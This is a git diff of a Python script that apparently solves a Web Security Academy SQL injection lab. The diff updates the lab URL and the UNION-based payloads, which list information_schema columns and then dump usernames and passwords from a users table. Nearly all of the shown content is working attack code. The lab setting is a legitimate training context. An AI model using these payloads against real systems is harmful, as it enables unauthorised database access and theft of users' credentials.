@@ -1,5 +1,5 @@
 
-# SQL injection UNION attack, retrieving data from other tables
+# SQL injection attack, listing the database contents on non-Oracle databases
 
 # Assumptions:
     # We know number of returned columns
@@ -16,7 +16,7 @@ proxy = {
     "https":"http://127.0.0.1:8080"
 }
 
-url = "https://0ad9004a040838e7c05f378500ef0026.web-security-academy.net/filter"
+url = "https://0ac80074030a14e3c07e3ef000330021.web-security-academy.net/filter"
 
 # Listing Databases
 
@@ -50,7 +50,7 @@ for t in tbs:
 
 # Listing columns in user table
 
-payload = "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--"
+payload = "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_vmwxcn'--"
 
 param = {
     "category" : "pets" + payload
@@ -66,7 +66,7 @@ for c in cols:
 
 # Dumping Users table
 
-payload = "' UNION SELECT username,password FROM users--"
+payload = "' UNION SELECT username_qgsgju,password_tdngfk FROM users_vmwxcn--"
 
 param = {
     "category" : "pets" + payload
